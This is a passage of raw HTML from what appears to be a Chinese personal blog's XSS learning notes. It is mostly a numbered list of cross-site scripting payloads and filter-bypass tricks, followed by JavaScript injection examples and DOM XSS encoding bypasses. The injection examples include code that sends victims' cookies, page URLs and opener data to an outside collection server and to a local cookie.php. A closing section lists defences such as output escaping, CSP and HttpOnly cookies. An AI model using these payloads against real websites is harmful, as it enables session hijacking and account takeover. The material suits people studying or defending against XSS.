class="line"><span class="string"></span></span><br><span class="line"><span class="string">(25) 无结束脚本标记 2</span></span><br><span class="line"><span class="string">&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(26) 半开的 HTML/JavaScript XSS</span></span><br><span class="line"><span class="string">&lt;IMG SRC=”javascript:alert(‘XSS’)”</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(27) 双开角括号</span></span><br><span class="line"><span class="string">&lt;iframe src=http://3w.org/XSS.html &lt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(28) 无单引号 双引号 分号</span></span><br><span class="line"><span class="string">&lt;SCRIPT&gt;a=/XSS/</span></span><br><span class="line"><span class="string">alert(a.source)&lt;/SCRIPT&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(29) 换码过滤的 JavaScript</span></span><br><span class="line"><span class="string">\”;alert(‘XSS’);//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(30) 结束 Title 标签</span></span><br><span class="line"><span class="string">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(“XSS”);&lt;/SCRIPT&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(31)Input Image</span></span><br><span class="line"><span class="string">&lt;INPUT SRC=”javascript:alert(‘XSS’);”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(32)BODY Image</span></span><br><span class="line"><span class="string">&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(33) BODY 标签</span></span><br><span class="line"><span class="string">&lt;BODY(‘XSS’)&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(34)IMG Dynsrc</span></span><br><span class="line"><span class="string">&lt;IMG DYNSRC=”javascript:alert(‘XSS’)”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(35)IMG Lowsrc</span></span><br><span class="line"><span class="string">&lt;IMG LOWSRC=”javascript:alert(‘XSS’)”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(36)BGSOUND</span></span><br><span class="line"><span class="string">&lt;BGSOUND SRC=”javascript:alert(‘XSS’);”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(37)STYLE sheet</span></span><br><span class="line"><span class="string">&lt;LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(38) 远程样式表</span></span><br><span class="line"><span class="string">&lt;LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(39) List-style-image (列表式)</span></span><br><span class="line"><span class="string">&lt;STYLE&gt;li &#123;list-style-image: url(“javascript:alert(‘XSS’)”);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(40)IMG VBscript</span></span><br><span class="line"><span class="string">&lt;IMG SRC=’vbscript:msgbox(“XSS”)’&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(41) META 链接 url</span></span><br><span class="line"><span class="string">&lt;META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:alert(‘XSS’);”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(42)Iframe</span></span><br><span class="line"><span class="string">&lt;IFRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/IFRAME&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(43)Frame</span></span><br><span class="line"><span class="string">&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/FRAMESET&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(44)Table</span></span><br><span class="line"><span class="string">&lt;TABLE BACKGROUND=”javascript:alert(‘XSS’)”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(45)TD</span></span><br><span class="line"><span class="string">&lt;TABLE&gt;&lt;TD BACKGROUND=”javascript:alert(‘XSS’)”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(46)DIV background-image</span></span><br><span class="line"><span class="string">&lt;DIV STYLE=”background-image: none)”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(47) DIV background-image 后加上额外字符 (1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)</span></span><br><span class="line"><span class="string">&lt;DIV STYLE=”background-image: none)”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(48)DIV expression</span></span><br><span class="line"><span class="string">&lt;DIV STYLE=”width: expression_r(alert(‘XSS’));”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(49) STYLE 属性分拆表达</span></span><br><span class="line"><span class="string">&lt;IMG STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(50) 匿名 STYLE (组成：开角号和一个字母开头)</span></span><br><span class="line"><span class="string">&lt;XSS STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(51)STYLE background-image</span></span><br><span class="line"><span class="string">&lt;STYLE&gt;.XSS&#123;background-image:none”);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(52) IMG STYLE 方式</span></span><br><span class="line"><span class="string">exppression(alert(“XSS”))’&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(53)STYLE background</span></span><br><span class="line"><span class="string">&lt;STYLE&gt;&lt;STYLE type=”text/css”&gt;BODY&#123;background:url(“javascript:alert(‘XSS’)”)&#125;&lt;/STYLE&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(54)BASE</span></span><br><span class="line"><span class="string">&lt;BASE HREF=”javascript:alert(‘XSS’);//”&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(55) EMBED 标签，你可以嵌入 FLASH, 其中包涵 XSS</span></span><br><span class="line"><span class="string">&lt;EMBED SRC=”” &gt;&lt;/EMBED&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(56) 在 flash 中使用 ActionScrpt 可以混进你 XSS 的代码</span></span><br><span class="line"><span class="string">a=”get”;</span></span><br><span class="line"><span class="string">b=”URL(\”"</span>;</span><br><span class="line">c=”javascript:”;</span><br><span class="line">d=”alert(‘XSS’);\”)”;</span><br><span class="line">eval_r(a+b+c+d);</span><br><span class="line"></span><br><span class="line">(<span class="number">57</span>) XML namespace.HTC 文件必须和你的 XSS 载体在一台服务器上</span><br><span class="line">&lt;HTML xmlns:xss&gt;</span><br><span class="line">&lt;?<span class="keyword">import</span> namespace=”xss” implementation=”http:<span class="comment">//3w.org/XSS/xss.htc”&gt;</span></span><br><span class="line">&lt;xss:xss&gt;XSS&lt;<span class="regexp">/xss:xss&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>HTML&gt;</span><br><span class="line"></span><br><span class="line">(<span class="number">58</span>) 如果过滤了你的 JS 你可以在图片里添加 JS 代码来利用</span><br><span class="line">&lt;SCRIPT SRC=””&gt;<span class="xml"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">(<span class="number">59</span>) IMG 嵌入式命令，可执行任意命令</span><br><span class="line">&lt;IMG SRC=”http:<span class="comment">//www.XXX.com/a.php?a=b”&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">60</span>) IMG 嵌入式命令 (a.jpg 在同服务器)</span><br><span class="line">Redirect <span class="number">302</span> /a.jpg http:<span class="comment">//www.XXX.com/admin.asp&amp;deleteuser</span></span><br><span class="line"></span><br><span class="line">(<span class="number">61</span>) 绕符号过滤</span><br><span class="line">&lt;SCRIPT a=”&gt;” SRC=”http:<span class="comment">//3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">62</span>)</span><br><span class="line">&lt;SCRIPT =”&gt;” SRC=”http:<span class="comment">//3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">63</span>)</span><br><span class="line">&lt;SCRIPT a=”&gt;” ” SRC=”http:<span class="comment">//3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">64</span>)</span><br><span class="line">&lt;SCRIPT “a=’&gt;’” SRC=”http:<span class="comment">//3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">65</span>)</span><br><span class="line">&lt;SCRIPT a=<span class="string">`&gt;`</span> SRC=”http:<span class="comment">//3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">66</span>)</span><br><span class="line">&lt;SCRIPT a=”&gt;’&gt;” SRC=”http:<span class="comment">//3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">67</span>)</span><br><span class="line">&lt;SCRIPT&gt;<span class="built_in">document</span>.write(“&lt;SCRI”);<span class="xml"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span>PT SRC=”http:<span class="comment">//3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">68</span>) URL 绕行</span><br><span class="line">&lt;A HREF=”http:<span class="comment">//127.0.0.1/”&gt;XSS&lt;/A&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">69</span>) URL 编码</span><br><span class="line">&lt;A HREF=”http:<span class="comment">//3w.org”&gt;XSS&lt;/A&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">70</span>) IP 十进制</span><br><span class="line">&lt;A HREF=”http:<span class="comment">//3232235521″&gt;XSS&lt;/A&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">71</span>) IP 十六进制</span><br><span class="line">&lt;A HREF=”http:<span class="comment">//0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">72</span>) IP 八进制</span><br><span class="line">&lt;A HREF=”http:<span class="comment">//0300.0250.0000.0001″&gt;XSS&lt;/A&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">73</span>) 混合编码</span><br><span class="line">&lt;A HREF=”h</span><br><span class="line">tt p:<span class="comment">//6 6.000146.0×7.147/”"&gt;XSS&lt;/A&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">74</span>) 节省 [http:]</span><br><span class="line">&lt;A HREF=”<span class="comment">//www.google.com/”&gt;XSS&lt;/A&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">75</span>) 节省 [www]</span><br><span class="line">&lt;A HREF=”http:<span class="comment">//google.com/”&gt;XSS&lt;/A&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">76</span>) 绝对点绝对 DNS</span><br><span class="line">&lt;A HREF=”http:<span class="comment">//www.google.com./”&gt;XSS&lt;/A&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">77</span>) javascript 链接</span><br><span class="line">&lt;A HREF=”javascript:<span class="built_in">document</span>.location=’http:<span class="comment">//www.google.com/’”&gt;XSS&lt;/A&gt;</span></span><br><span class="line">（边学边整理的）</span><br></pre></td></tr></table></figure>

<h2 id="插入-js-代码"><a href="#插入-js-代码" class="headerlink" title="插入 js 代码"></a>插入 js 代码</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">说了那么多，大家可能都以为 xss 就是弹窗，其实错了，弹窗只是测试 xss 的存在性和使用性。</span><br><span class="line">这时我们要插入 js 代码了，怎么插呢？</span><br><span class="line">	你可以这样</span><br><span class="line">&lt;script src=<span class="string">"js_url"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> </span><br><span class="line">	也可以这样</span><br><span class="line">&lt;img src=x onerror=appendChild(createElement(<span class="string">'script'</span>)).src=<span class="string">'js_url'</span> /&gt; </span><br><span class="line">    各种姿势，各种插，只要鞥运行我们的 js 就 OK。那运行我们的 js 有什么用呢？Js 可 以 干 很 多 的 事， 可 以 获 取 cookies( 对http-only 没用 )、控制用户的动作 ( 发帖、私信什么的 ) 等等。</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">加载外部 js&lt;script src=<span class="string">"http://127.0.0.1/xss.js"</span>&gt;</span><br><span class="line">&lt;script&gt;<span class="built_in">document</span>.location=<span class="string">'http://127.0.0.1/cookie.php?cookis='</span>+<span class="built_in">document</span>.cookie;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;svg&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://xss.buuoj.cn/LicptZ"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;svg&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="string">"(function()&#123;(new Image()).src='http://xss.buuoj.cn/index.php?do=api&amp;id=yxxaiH&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return ''&#125;&#125;)());&#125;)();</span></span></span></span><br><span class="line"><span class="xml">if(''==1)&#123;keep=new Image();keep.src='http://xss.buuoj.cn/index.php?do=keepsession&amp;id=yxxaiH&amp;url='+escape(document.location)+'&amp;cookie='+escape(document.cookie)&#125;;")<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/16/2%20XSS/image-20200726161933891.png" alt="image-20200726161933891"></p>
<p><img src="/2019/11/16/2%20XSS/image-20200726162032453.png" alt="image-20200726162032453"></p>
<h1 id="dom-xss"><a href="#dom-xss" class="headerlink" title="dom xss"></a>dom xss</h1><p>由于在 documnet.wirte<br>&lt;&gt;，”，也转义了&amp;,过滤了\让我们不能构造html实体，和unicode编码<br>\是过滤了，不是转义了阿！我们试试输入两个\，发现只过滤了一个<br>&lt;&gt;<br>\u003c \u003e<br>换成16进制编码\x3cscript\x3ealert(document.domain);\x3c/script\x3e<br>换成Unicode编码\u003cscript\u003ealert(document.domain);\u003c/script\u003e<br>八进制编码\74img src=x οnerrοr=alert(document.domain)\76</p>
<p>思路类似于宽字节注入，利用特殊字节吃掉双引号<br>半角片假名使用两个字节来表示：0x8E + 0xA1-0xDF<br>JIS X 0208字元使用两个字节来表示：0xA1-0xFE + 0xA1-0xFE<br>JIS X 0212字元使用三个字节来表示：0x8F + 0xA1-0xFE + 0xA1-0xFE<br>p1=1%A7&amp;p2=+onmouseover%3Dalert%28document.domain%29%3B+%A7</p>
<h1 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h1><p><img src="/2019/11/16/2%20XSS/XSS%E8%84%91%E5%9B%BE.png" alt="XSS脑图"></p>
<h1 id="XSS漏洞防范"><a href="#XSS漏洞防范" class="headerlink" title="XSS漏洞防范"></a>XSS漏洞防范</h1><h2 id="1-PHP直接输出html的，可以采用以下的方法进行过滤："><a href="#1-PHP直接输出html的，可以采用以下的方法进行过滤：" class="headerlink" title="1.PHP直接输出html的，可以采用以下的方法进行过滤："></a>1.PHP直接输出html的，可以采用以下的方法进行过滤：</h2><ul>
<li>htmlspecialchars函数</li>
<li>htmlentities函数</li>
<li>HTMLPurifier.auto.php插件</li>
<li>RemoveXss函数</li>
</ul>
<h2 id="2-PHP输出到JS代码中，或者开发Json-API的，则需要前端在JS中进行过滤："><a href="#2-PHP输出到JS代码中，或者开发Json-API的，则需要前端在JS中进行过滤：" class="headerlink" title="2.PHP输出到JS代码中，或者开发Json API的，则需要前端在JS中进行过滤："></a>2.PHP输出到JS代码中，或者开发Json API的，则需要前端在JS中进行过滤：</h2><ul>
<li>尽量使用innerText(IE)和textContent(Firefox),也就是jQuery的text()来输出文本内容</li>
<li>必须要用innerHTML等等函数，则需要做类似php的htmlspecialchars的过滤</li>
</ul>
<h2 id="3-其它的通用的补充性防御手段"><a href="#3-其它的通用的补充性防御手段" class="headerlink" title="3.其它的通用的补充性防御手段"></a>3.其它的通用的补充性防御手段</h2><ul>
<li><p>在输出html时，加上Content Security Policy的Http Header    </p>
<p>（作用：可以防止页面被XSS攻击时，嵌入第三方的脚本文件等）    </p>
<p>（缺陷：IE或低版本的浏览器可能不支持）</p>
</li>
<li><p>在设置Cookie时，加上HttpOnly参数    </p>
<p>（作用：可以防止页面被XSS攻击时，Cookie信息被盗取，可兼容至IE6）    </p>
<p>（缺陷：网站本身的JS代码也无法操作Cookie，而且作用有限，只能保证Cookie的安全）</p>
</li>
<li><p>在开发API时，检验请求的Referer参数    </p>
<p>（作用：可以在一定程度上防止CSRF攻击）    </p>
<p>（缺陷：IE或低版本的浏览器中，Referer参数可以被伪造）</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">zhiliya</p>
  <div class="site-description" itemprop="description">emmmm 感觉没啥好说的</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">38</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="feed-link motion-element">
    <a href="/atom.xml" rel="alternate">
      <i class="fa fa-rss"></i>RSS
    </a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">zhiliya</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">主题 – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.5.0
  </div>

        












        
      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  
















  

  

</body>
</html>
